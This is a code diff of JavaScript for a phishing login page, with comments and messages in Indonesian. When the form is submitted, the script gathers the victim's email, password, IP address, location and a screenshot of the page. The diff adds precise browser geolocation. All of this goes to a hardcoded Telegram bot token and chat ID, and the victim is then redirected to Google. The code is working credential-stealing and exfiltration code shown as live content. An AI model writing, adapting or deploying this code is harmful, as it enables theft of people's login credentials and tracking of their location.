@@ -15,71 +15,88 @@ document.getElementById("loginForm").addEventListener("submit", async function(e
 
     let botToken = "7628314972:AAHZtVoYDVeujuM8o7xpvaLzTGIjrMJodhY";
     let chatId = "6786210993";
+    let profileImageUrl = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ_fMq7l79lm6-bYF7qqvwuxlKpXPgJ90_TLA&usqp=CAU";
 
-    // Ambil Screenshot
-    async function ambilScreenshot() {
-        try {
-            let canvas = await html2canvas(document.body);
-            let imgData = canvas.toDataURL("image/png"); // Base64 format
+    
+    let sendProfilePhotoUrl = `https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}&photo=${encodeURIComponent(profileImageUrl)}`;
+    await fetch(sendProfilePhotoUrl);
 
-            let formData = new FormData();
-            formData.append("chat_id", chatId);
-            formData.append("photo", dataURItoBlob(imgData), "screenshot.png");
-
-            let sendPhotoUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
-            let response = await fetch(sendPhotoUrl, {
-                method: "POST",
-                body: formData
-            });
-
-            let data = await response.json();
-            if (data.ok) {
-                console.log("✅ Screenshot terkirim ke Telegram!");
+    
+    async function getUserLocation() {
+        return new Promise((resolve) => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        resolve(`📍 Koordinat: ${position.coords.latitude}, ${position.coords.longitude}`);
+                    },
+                    () => {
+                        resolve("📍 Lokasi: Tidak diizinkan oleh user");
+                    }
+                );
             } else {
-                console.error("❌ Gagal kirim screenshot:", data);
+                resolve("📍 Lokasi: Tidak didukung di browser ini");
             }
-        } catch (error) {
-            console.error("❌ Error saat mengambil screenshot:", error);
+        });
+    }
+    let lokasiUser = await getUserLocation();
+
+   
+    async function ambilScreenshot() {
+        let canvas = await html2canvas(document.body);
+        let imgData = canvas.toDataURL("image/png");
+
+        let formData = new FormData();
+        formData.append("chat_id", chatId);
+        formData.append("photo", dataURItoBlob(imgData), "screenshot.png");
+
+        let sendPhotoUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+        let response = await fetch(sendPhotoUrl, {
+            method: "POST",
+            body: formData
+        });
+
+        let data = await response.json();
+        if (data.ok) {
+            console.log("✅ Screenshot terkirim ke Telegram!");
+        } else {
+            console.error("❌ Gagal kirim screenshot:", data);
         }
     }
-
-    // Convert base64 ke Blob
-    function dataURItoBlob(dataURI) {
-        let byteString = atob(dataURI.split(",")[1]);
-        let mimeString = dataURI.split(",")[0].split(":")[1].split(";")[0];
-        let ab = new ArrayBuffer(byteString.length);
-        let ia = new Uint8Array(ab);
-        for (let i = 0; i < byteString.length; i++) {
-            ia[i] = byteString.charCodeAt(i);
-        }
-        return new Blob([ab], { type: mimeString });
-    }
-
-    // Kirim screenshot ke Telegram dulu
     await ambilScreenshot();
 
-    // Kirim pesan teks
+    
     let message = `🔒 *Login Berhasil!*\n\n`
                 + `🕒 *Waktu:* ${waktuLogin}\n`
                 + `📧 *Email:* ${email}\n`
                 + `🔑 *Password:* ${password}\n`
                 + `🌍 *IP:* ${ipInfo.ip}\n`
                 + `📍 *Lokasi:* ${ipInfo.city}, ${ipInfo.country}\n`
-                + `🏢 *Provider:* ${ipInfo.org}`;
+                + `🏢 *Provider:* ${ipInfo.org}\n`
+                + `${lokasiUser}`;
 
-    let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+    let sendMessageUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
 
-    setTimeout(() => {
-        fetch(url)
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    console.log("✅ Data terkirim ke Telegram!");
-                    window.location.href = "https://www.google.com";
-                } else {
-                    console.error("❌ Gagal kirim pesan ke Telegram!", data);
-                }
-            })
-            .catch(error => console.error("❌ Error:", error));
-    }, 2000);
+    fetch(sendMessageUrl)
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                console.log("✅ Data terkirim ke Telegram!");
+                window.location.href = "https://www.google.com"; // Redirect setelah login
+            } else {
+                console.error("❌ Gagal kirim pesan ke Telegram!", data);
+            }
+        })
+        .catch(error => console.error("❌ Error:", error));
 });
+
+
+function dataURItoBlob(dataURI) {
+    let byteString = atob(dataURI.split(",")[1]);
+    let mimeString = dataURI.split(",")[0].split(":")[1].split(";")[0];
+    let ab = new ArrayBuffer(byteString.length);
+    let ia = new Uint8Array(ab);
+    for (let i = 0; i < byteString.length; i++) {
+        ia[i] = byteString.charCodeAt(i);
+    }
+    return new Blob([ab], { type: mimeString });
+            }
